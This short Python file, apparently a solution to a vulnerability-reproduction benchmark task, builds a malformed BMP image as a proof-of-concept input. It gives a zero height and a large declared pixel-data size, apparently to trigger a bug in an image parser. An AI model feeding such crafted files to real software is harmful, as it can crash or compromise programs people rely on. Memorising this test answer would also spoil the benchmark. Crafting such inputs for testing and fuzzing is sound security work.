import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        bfType = b'BM'
        bfSize = 17814
        bfReserved1 = 0
        bfReserved2 = 0
        bfOffBits = 54
        file_header = struct.pack('<2s I H H I', bfType, bfSize, bfReserved1, bfReserved2, bfOffBits)
        biSize = 40
        biWidth = 1
        biHeight = 0
        biPlanes = 1
        biBitCount = 24
        biCompression = 0
        biSizeImage = bfSize - bfOffBits
        biXPelsPerMeter = 0
        biYPelsPerMeter = 0
        biClrUsed = 0
        biClrImportant = 0
        info_header = struct.pack('<I i i H H I I I I I I',
                                  biSize, biWidth, biHeight, biPlanes, biBitCount,
                                  biCompression, biSizeImage, biXPelsPerMeter, biYPelsPerMeter,
                                  biClrUsed, biClrImportant)
        pixel_data = b'\x00' * biSizeImage
        poc = file_header + info_header + pixel_data
        return poc
